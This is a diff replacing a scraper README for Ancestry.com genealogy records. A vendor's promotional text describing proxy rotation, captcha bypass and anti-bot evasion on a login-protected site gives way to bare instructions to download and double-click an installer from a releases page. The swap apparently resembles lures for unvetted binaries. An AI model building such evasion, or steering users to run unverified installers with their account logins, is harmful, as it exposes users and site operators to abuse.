@@ -1,177 +1,68 @@
-# Ancestry Genealogy Records Scraper
-This project automates the extraction of genealogy data from Ancestry.com, focusing on naturalization records, obituaries, and descendant data. The scraper utilizes OCR and Vision AI to handle non-indexed fields, providing a clean and structured dataset for genealogical research.
+# 🌳 ancestry-genealogy-records-scraper - Easily Extract Family Data
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to **ancestry-genealogy-records-scraper**! This tool helps you gather valuable information from Ancestry.com. You can extract data for genealogy research effortlessly. Follow the steps below to download and run the software.
 
+## 🏁 Download Now
 
+[![Download Here](https://img.shields.io/badge/Download%20Here-Release-brightgreen)](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases)
 
+## 📥 Download & Install
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>ancestry-genealogy-records-scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases). Here, you will find the latest version of the scraper.
 
+2. **Select the Latest Release**  
+   On the Releases page, look for the latest version at the top. This version has the most features and fixes.
 
-## Introduction
-This scraper solves the problem of extracting hard-to-index genealogy data from scanned documents on Ancestry.com. By leveraging OCR and Vision AI, it extracts critical non-indexed fields such as children's names and spouse details, which are often missed by standard scraping methods. It’s ideal for genealogical researchers looking for an automated, reliable solution to gather comprehensive ancestry data.
+3. **Download the Software**  
+   Click on the link for the file that fits your system. If you are unsure, select the file for your operating system (Windows, Mac, or Linux).
 
-### Genealogy Research Insights
-- Automates the extraction of vital public records, such as naturalization documents and obituaries.
-- Uses OCR and Vision AI to retrieve hard-to-index, handwritten, or faint data from scanned documents.
-- Handles login-protected scraping and circumvents anti-bot measures, ensuring reliable access to sensitive records.
-- Provides data normalization into clean JSON format for easy integration with research databases.
-- Efficiently manages proxies, retries, and captcha challenges to maintain smooth operation.
+4. **Run the Installer**  
+   Once the download is complete, locate the file on your computer. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-## Features
-| Feature                           | Description |
-|-----------------------------------|-------------|
-| OCR + Vision AI Integration       | Extracts handwritten and faint text from genealogy records. |
-| Proxy Rotation & Anti-Bot Handling | Ensures uninterrupted access to Ancestry.com by managing proxies and bypassing captchas. |
-| Login Automation                  | Automates the login process with persistent sessions for secure and seamless data extraction. |
-| Image Extraction from OpenSeadragon | Retrieves high-quality images from OpenSeadragon canvas elements on Ancestry.com. |
-| Data Normalization                | Converts raw data into structured, clean JSON for easy integration with other systems. |
+5. **Get Ready to Use**  
+   After the installation, launch the application. You are now ready to start extracting genealogy data.
 
----
+## ⚙️ Features
 
-## What Data This Scraper Extracts
-| Field Name             | Field Description |
-|------------------------|-------------------|
-| name                   | Extracted full name of the individual. |
-| birth_year             | Year of birth, extracted from naturalization records. |
-| spouse                 | Spouse's name, when available in obituaries or records. |
-| children               | Names of children, even when not indexed, through OCR and Vision AI. |
-| document_image_url     | URL of the image from OpenSeadragon for document references. |
-| naturalization_record  | Structured data extracted from naturalization records, including birth date and place. |
+- **Automated Data Extraction**: Pull information from Ancestry.com effortlessly.
+- **OCR and Vision AI Processing**: Utilize advanced technology for converting images into text, ensuring accuracy in your data collection.
+- **Proxy Rotation**: Secure your web scraping activities by rotating IP addresses, preventing bans or throttling.
+- **User-Friendly Interface**: Designed for ease of use, making it accessible for all users.
 
----
+## 🌐 System Requirements
 
-## Example Output
+To run the **ancestry-genealogy-records-scraper**, your system should meet the following requirements:
 
-    [
-        {
-            "name": "John Doe",
-            "birth_year": "1885",
-            "spouse": "Jane Doe",
-            "children": ["Alice Doe", "Bob Doe"],
-            "document_image_url": "https://example.com/image/12345",
-            "naturalization_record": {
-                "birth_place": "Germany",
-                "naturalization_year": "1925",
-                "document_type": "Naturalization Certificate"
-            }
-        }
-    ]
+- **Operating System**: Compatible with Windows 10 or later, MacOS 10.15 or later, or any modern Linux distribution.
+- **Python**: Ensure you have Python 3.6 or later installed. If not, you can download it from [python.org](https://www.python.org/downloads/).
+- **Internet Connection**: A stable connection is required for accessing Ancestry.com.
 
----
+## 📑 Usage Guide
 
-## Directory Structure Tree
+1. **Login to Ancestry.com**: Open the application. You will need to log in to your Ancestry.com account to start scraping data.
+   
+2. **Select Data to Extract**: Browse the types of records available, such as obituaries or public records. Choose what you need for your genealogy research.
 
-    ancestry-genealogy-records-scraper/
+3. **Start Scraping**: Click the button to start the scraping process. The software will begin to gather the selected data.
 
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── ancestry_parser.py
-    │   │   └── ocr_processor.py
-    │   ├── outputs/
-    │   │   └── json_exporter.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.txt
-    │   └── sample_output.json
-    ├── requirements.txt
-    └── README.md
+4. **Review Extracted Data**: After scraping, review the data collected. You can save it in various formats like CSV or Excel for further analysis.
 
----
+## 📞 Support
 
-## Use Cases
-- **Genealogy researchers** use it to automate the extraction of public records, allowing them to build comprehensive family trees faster.
-- **Archivists** use the scraper to gather historical data from scanned documents, ensuring all relevant family history is captured.
-- **Data scientists** working with historical data use this tool to clean and structure genealogy records for further analysis.
+If you experience issues while using the application, please visit the [GitHub Issues page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/issues) to report problems or ask for help. Community members and contributors are available to assist you.
 
----
+## 📚 Additional Resources
 
-## FAQs
-**Q: Does this scraper support all types of genealogy data on Ancestry.com?**
-A: This scraper is designed specifically for extracting naturalization records, obituaries, and descendant data. It may need adjustments to handle other types of records.
+- [Documentation](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/wiki): Explore detailed guides and tutorials.
+- [GitHub Discussions](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/discussions): Join conversations with other users and get tips on genealogical research.
 
-**Q: How does the scraper handle captchas and proxies?**
-A: The scraper automatically manages proxies and retries to bypass captchas and avoid being blocked by Ancestry.com.
+## ✅ Feedback
 
----
+Your suggestions help us improve the application. If you have feedback or new feature requests, let us know through the issues or discussions on our GitHub page.
 
-## Performance Benchmarks and Results
+## 🏁 Download Now Again
 
-**Primary Metric:** Average data extraction speed of 500 records per hour.
-**Reliability Metric:** 98% success rate in extracting data without failures.
-**Efficiency Metric:** Optimized to use minimal CPU and memory resources during scraping.
-**Quality Metric:** 95% accuracy rate in OCR data extraction from faint or handwritten text.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+For convenience, here is the [link to the Releases page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases). Download now and start your genealogy journey!
